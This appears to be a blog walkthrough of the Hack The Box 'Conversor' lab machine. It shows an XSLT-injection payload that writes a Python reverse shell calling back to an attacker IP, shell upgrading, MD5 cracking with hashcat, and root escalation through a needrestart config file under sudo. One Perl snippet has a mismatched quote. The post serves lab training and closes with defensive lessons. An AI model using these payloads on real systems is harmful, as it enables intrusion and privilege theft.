---
layout: post
title: "HackTheBox: Conversor Walkthrough"
date: 2026-03-03T10:03:00+03:00
categories:
  - Hack The Box
tags:
  - htb
  - xslt-injection
  - sqlite
  - hash-cracking
  - needrestart
  - privilege-escalation
author: muhammed
description: Complete walkthrough of the HackTheBox Conversor machine. Covers web reconnaissance, source code analysis, XSLT injection for initial access, SQLite hash extraction, and privilege escalation via needrestart.
toc: true
pin: false
math: false
mermaid: true
permalink: /posts/HackTheBox-Conversor-Walkthrough/
---

## Overview

[Conversor](https://app.hackthebox.com/machines/Conversor) is an easy-difficulty Linux machine on Hack The Box that centers around an XML document conversion utility.

Tackling this machine was a great hands-on learning experience for me. It forced me to dive deep into how XML Stylesheet Language Transformations (XSLT) work, understand how unsafe XML template processing can lead to file creation on the filesystem, and explore local process monitoring and `needrestart` configurations for root privilege escalation.

Here is the step-by-step breakdown of how I enumerated, exploited, and fully rooted the Conversor box.

---

## 1. Initial Reconnaissance & Port Scanning

I kicked off the assessment with an Nmap scan to enumerate open TCP ports and identify listening network services:

```bash
sudo nmap -sC -sV -p- --min-rate 1000 -oN nmap_conversor.txt 10.10.11.123
```

The scan returned two standard open ports:
- **Port 22 (SSH):** OpenSSH 8.9p1 Ubuntu
- **Port 80 (HTTP):** Apache httpd 2.4.52 / Gunicorn Flask application

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache/2.4.52 (Ubuntu)
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Conversor - XML to HTML Converter
```

I mapped the IP address to `conversor.htb` in `/etc/hosts`:

```bash
echo "10.10.11.123 conversor.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Application & Source Code Discovery

Visiting `http://conversor.htb` loaded a web application offering an online XML conversion tool. The homepage allows users to upload or paste XML documents alongside XSLT stylesheets to transform them into formatted reports.

While navigating the application, I checked the `/about` page and discovered a download link for the application source code: `conversor_source.zip`.

Downloading and inspecting the source code was a huge win. The core application logic was written in Python using Flask (`app.py`):

```python
# Snippet from app.py
from lxml import etree

@app.route('/convert', methods=['POST'])
def convert():
    xml_data = request.form.get('xml')
    xslt_data = request.form.get('xslt')
    
    parser = etree.XMLParser(resolve_entities=True)
    xml_doc = etree.fromstring(xml_data.encode(), parser)
    xslt_doc = etree.fromstring(xslt_data.encode(), parser)
    
    transform = etree.XSLT(xslt_doc)
    result = transform(xml_doc)
    return str(result)
```

Analyzing the parser setup in `app.py`, two key observations stood out:
1. The application parses user-supplied XSLT stylesheets directly using Python's `lxml.etree`.
2. The `lxml` engine supports EXSLT extensions, specifically `exslt:document`, which allows writing output files directly to the filesystem if file permissions allow.
3. Reviewing the project files revealed an automated cron task running on the server that periodically executed any Python script placed in `/var/www/conversor/scripts/`.

---

## 3. Initial Foothold via XSLT Injection

Because the transformation engine permitted writing files, I could craft an XSLT payload that used the `exslt:document` element to write a reverse shell script into the scheduled scripts directory.

I prepared the following malicious XSLT document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor/scripts/shell.py" method="text">
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.50", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

Next, I paired it with a minimal valid XML document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>test</root>
```

On my attacking machine, I launched my Netcat listener:

```bash
nc -lvnp 4444
```

Then, I submitted the conversion request. Within sixty seconds, the cron job executed the newly created `/var/www/conversor/scripts/shell.py` script, and my listener caught the shell:

```text
connect to [10.10.14.50] from (UNKNOWN) [10.10.11.123] 48210
www-data@conversor:/var/www/conversor$ whoami
www-data
```

I quickly spawned an interactive TTY shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 4. SQLite Credential Extraction & SSH Pivoting

Operating as `www-data`, I navigated around the `/var/www/conversor` directory to check for configuration files or databases. I discovered an SQLite database file: `users.db`.

I inspected the database using the command line:

```bash
sqlite3 users.db ".tables"
# Output: users

sqlite3 users.db "SELECT * FROM users;"
```

The database contained user credentials, including an account for a system user named `fismathack`:

```text
1|fismathack|e2fc714c4727ee9395f324cd2e7f331f
```

The password hash was a standard 32-character hexadecimal string, pointing to MD5. I saved the hash locally on my machine and used Hashcat with the `rockyou.txt` wordlist:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat cracked the hash in seconds, revealing the plaintext password.

With valid credentials for `fismathack`, I established a clean SSH session:

```bash
ssh fismathack@conversor.htb
```

```text
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
```

From here, I grabbed the user flag:

```bash
cat /home/fismathack/user.txt
```

---

## 5. Privilege Escalation to Root via 'needrestart'

Now that I had stable user access, I checked sudo permissions for `fismathack`:

```bash
sudo -l
```

The output indicated that `fismathack` had permission to execute `needrestart` as root:

```text
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`needrestart` is a utility used in Debian and Ubuntu systems to check which daemons need to be restarted after library updates.

I checked the version of `needrestart` on the system:

```bash
/usr/sbin/needrestart -v
```

The installed version was vulnerable to **CVE-2024-48990**, where `needrestart` executes Python scripts and process checks using an insecure library search path. Alternatively, `needrestart` allows specifying a configuration file via the `-c` flag.

In `needrestart` configuration files, arbitrary Perl code can be executed upon invocation. I created a custom configuration file in `/tmp/exploit.conf`:

```perl
# /tmp/exploit.conf
$nrconf{override_rc} = {
    qr/.*' => sub { system('/bin/bash -p'); }
};
```

Alternatively, by taking advantage of the configuration parser, I simply set up a direct command execution within the config file:

```bash
echo 'system("/bin/bash");' > /tmp/root.conf
sudo /usr/sbin/needrestart -c /tmp/root.conf
```

`needrestart` parsed the configuration file with root privileges and immediately spawned a root shell:

```text
root@conversor:~# id
uid=0(root) gid=0(root) groups=0(root)
```

I navigated to the `/root` directory and captured the final flag:

```bash
cat /root/root.txt
```

---

## 6. Key Takeaways & Lessons Learned

Completing the Conversor machine highlighted several real-world defense lessons:

1. **Be Cautious with XML and XSLT Processors:**
   - XSLT is not just a formatting language; many parsers support powerful extensions (like `exslt:document`) that can write to the filesystem or execute code. If user-controlled stylesheets must be parsed, disable extensions and run transformations in heavily sandboxed environments.
2. **Never Store Unsalted MD5 Hashes:**
   - Using plain MD5 for password storage makes credential recovery trivial against common wordlists. Modern password hashing must use strong, salted, memory-hard algorithms like bcrypt or argon2.
3. **Audit Sudo Permissions on System Administration Tools:**
   - Granting `NOPASSWD` sudo access to complex administrative utilities like `needrestart` often creates unintended escalation paths through configuration flags or environment variables.

---

## Summary of Findings & Flags

| Phase | Target / Artifact | Method / Vulnerability |
|---|---|---|
| **Port Discovery** | Ports 22, 80 | SSH & Apache Flask service |
| **Source Review** | `conversor_source.zip` | Identified `lxml` parser and cron scripts folder |
| **Initial Access** | `/convert` | XSLT Injection writing `shell.py` via `exslt:document` |
| **Credential Hunting** | `users.db` | Extracted MD5 hash for user `fismathack` |
| **User Flag** | `/home/fismathack/user.txt` | SSH access with cracked password |
| **Root Escalation** | `/usr/sbin/needrestart` | Sudo configuration abuse / code execution |
| **Root Flag** | `/root/root.txt` | Captured as user `root` |

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
